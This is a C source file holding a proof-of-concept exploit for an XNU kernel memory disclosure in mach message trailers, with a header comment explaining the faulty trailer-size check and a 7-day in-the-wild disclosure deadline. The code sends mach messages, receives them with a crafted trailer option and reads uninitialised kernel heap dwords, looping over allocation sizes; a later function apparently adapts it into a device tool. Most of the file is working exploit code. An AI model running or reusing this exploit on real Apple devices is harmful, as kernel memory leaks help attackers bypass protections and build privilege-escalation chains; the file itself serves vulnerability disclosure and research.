// @i41nbeer
#if 0
XNU kernel memory disclosure in mach message trailers

XNU doesn't correctly handle the trailer type argument:
MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_SEQNO | MACH_RCV_TRAILER_CTX)
specifically, in ipc_kmsg_add_trailer this check is wrong:

  trailer->msgh_trailer_size = REQUESTED_TRAILER_SIZE(thread_is_64bit_addr(thread), option);
  ...
  if (GET_RCV_ELEMENTS(option) >= MACH_RCV_TRAILER_AV) {
    trailer->msgh_ad = 0;
  }

REQUESTED_TRAILER_SIZE doesn't know what to do with MACH_RCV_TRAILER_SEQNO | MACH_RCV_TRAILER_CTX, so it falls through to
  sizeof(mach_msg_max_trailer_t))))))))

but then the msgh_ad field doesn't get cleared, because MACH_RCV_TRAILER_AV (7) is greater than (MACH_RCV_TRAILER_SEQNO | MACH_RCV_TRAILER_CTX) (1|4)

Fundamentally, there's a confusion about whether that trailer type field is a single value, or a bit-field.
I think it's meant to be a single value, not a bit field, but this isn't correctly enforced.

This allows the disclosure of a single dword from an (almost) arbitrary kalloc size-class.

We have evidence that this vulnerability is being exploited in the wild, therefore this bug
is subject to a 7-day disclosure deadline beginning today, Thursday October 29th 2020,
and expiring Thursday November 5th 2020.
#endif

#include <stdio.h>
#include <stdlib.h>

#include <mach/mach.h>

extern mach_port_t mach_reply_port(void);

uint32_t disclose_dword_for_size(uint32_t send_msg_size) {
    kern_return_t err;

    mach_msg_header_t* msg = malloc(send_msg_size);
    memset(msg, 0, send_msg_size);

    mach_port_t p = mach_reply_port();

    msg->msgh_bits = MACH_MSGH_BITS_SET_PORTS(MACH_MSG_TYPE_MAKE_SEND, 0, 0);
    msg->msgh_remote_port = p;
    msg->msgh_size = send_msg_size;

    err = mach_msg_send(msg);
    if (err != KERN_SUCCESS) {
        printf("send failed\n");
        return 0;
    }

    size_t rcv_msg_size = send_msg_size + 0x100;
    mach_msg_header_t* rcv = malloc(rcv_msg_size);
    memset(rcv, 0, rcv_msg_size);

    err = mach_msg(rcv,
                   MACH_RCV_TRAILER_ELEMENTS(MACH_RCV_TRAILER_SEQNO | MACH_RCV_TRAILER_CTX) | MACH_RCV_MSG,
                   0,
                   rcv_msg_size,
                   p,
                   0,
                   0);
    if (err != KERN_SUCCESS) {
        printf("failed to receive message\n");
        return 0;
    }
    if (rcv->msgh_size > send_msg_size) {
        printf("invalid msgh_size\n");
        return 0;
    }
    uint32_t uninit = *(uint32_t*)(((uint8_t*)rcv) + rcv->msgh_size + 0x3c);
    return uninit;
}

int main2() {
    extern char *get_current_deviceModel(void);
    printf("Thiết bị: %s\n", get_current_deviceModel());
    printf("Exploiting...\n");
    for (size_t size = 0x200; size < 0x1000; size += 0x14) {
        for (int i = 0; i < 20; i++) {
            uint32_t val = disclose_dword_for_size(size);
            if (val != 0) {
                printf("0x%08x\n", val);
            }
        }
    }
    return 0;
}
